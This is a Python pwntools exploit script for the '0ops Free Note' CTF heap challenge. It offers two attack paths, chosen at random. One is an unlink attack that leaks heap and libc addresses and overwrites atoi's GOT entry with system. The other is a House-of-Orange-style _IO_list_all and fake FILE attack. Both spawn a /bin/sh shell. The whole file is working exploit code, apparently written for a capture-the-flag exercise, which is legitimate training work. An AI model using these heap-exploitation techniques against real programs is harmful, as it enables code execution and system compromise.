from parse_args_and_some_func import *

sh = all_parsed_args['io']
cur_elf = all_parsed_args['cur_elf']

if all_parsed_args['debug_enable']:
    libc = cur_elf.libc
else:
    libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so')

context.arch="amd64"


def list_note():
    sh.sendlineafter("Your choice: ", "1")
    msg = sh.recvuntil("== 0ops Free Note ==\n")
    info("msg: {}".format(msg))
    return msg


def new_note(length, data):
    sh.sendlineafter("Your choice: ", "2")
    sh.sendlineafter("Length of new note: ", str(length))
    sh.sendafter("Enter your note: ", data)
    sh.recvline()


def edit_note(idx, length, data):
    sh.sendlineafter("Your choice: ", "3")
    sh.sendlineafter("Note number: ", str(idx))
    sh.sendlineafter("Length of note: ", str(length))
    sh.sendafter("Enter your note: ", data)
    sh.recvline()


def delete_note(idx):
    sh.sendlineafter("Your choice: ", "4")
    sh.sendlineafter("Note number: ", str(idx))
    sh.recvline()


def attack_unlink():
    # leak addr
    new_note(0x80, "a" * 0x80) # 0 a
    new_note(0x100, "a" * 0x100) # 1 b
    new_note(0x80, "a" * 0x80) # 2 c
    new_note(0x80, "a" * 0x80) # 3 d

    delete_note(2)
    delete_note(0) # a ---> c

    new_note(0x80, "a" * 0x80) # c
    delete_note(2) # c ---> a
    # leak heap addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_heap_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)

    new_note(0x80, "b" * 0x80) # a

    # leak libc addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_libc_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc_base_addr)

    libc.address = libc_base_addr

    # realloc and unlink
    layout = [0, 0x101, leak_heap_addr-0x17d8 - 0x18, 
            leak_heap_addr - 0x17d8 - 0x10, 0xe0 * "a",
            0x100, 0x90]
    edit_note(1, 0x180, flat(layout, length=0x180, filler="a"))

    delete_note(0)

    layout = [0, [1, 8, cur_elf.got['atoi']] * 2]
    edit_note(1, 0x180, flat(layout, length=0x180, filler="\x00"))

    edit_note(1, 8, flat(libc.sym['system']))

    sh.sendlineafter("Your choice: ", "/bin/sh")

    sh.interactive()


def attack_io_file():
    # leak addr
    new_note(0x200, "a" * 0x200) # 0 a
    new_note(0x80, "a" * 0x80) # 1 b
    new_note(0x200, "a" * 0x200) # 2 c
    new_note(0x80, "a" * 0x80) # 3 d

    delete_note(2)
    delete_note(0) # a ---> c

    new_note(0x200, "a" * 0x200) # c
    delete_note(2) # c ---> a
    # leak heap addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_heap_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_heap_addr", leak_heap_addr)

    new_note(0x200, "b" * 0x200) # a

    # leak libc addr
    msg  = list_note()
    idx = msg.find(b"\n")
    leak_libc_addr = u64(msg[3:idx].ljust(8, b"\x00"))
    LOG_ADDR("leak_libc_addr", leak_libc_addr)
    libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
    LOG_ADDR("libc_base_addr", libc_base_addr)

    libc.address = libc_base_addr

    io_list_all_addr = libc.sym['_IO_list_all']
    layout = ["a" * 0x80, 0, 0x211]
    edit_note(1, 0x280, flat(layout, length=0x280, filler="a"))

    # re-put unsorted bin 
    delete_note(0)

    layout = ["a" * 0x80, "/bin/sh\x00", 0x61,
                0, io_list_all_addr - 0x10, 0, 1, 0xa8 * "\x00",
                leak_heap_addr + 0x380, 0, 0, [libc.sym['system']] * 3]

    edit_note(1, 0x280, flat(layout, length=0x280, filler="\x00"))

    sh.sendlineafter("Your choice: ", "2")
    sh.sendlineafter("Length of new note: ", str(0x300))

    sh.interactive()



if __name__ == '__main__':
    import random
    if random.randint(0, 100) >= 50:
        info("Use unlink!\n")
        sleep(3)
        attack_unlink()
    else:
        info("Use IO_FILE!\n")
        sleep(3)
        attack_io_file()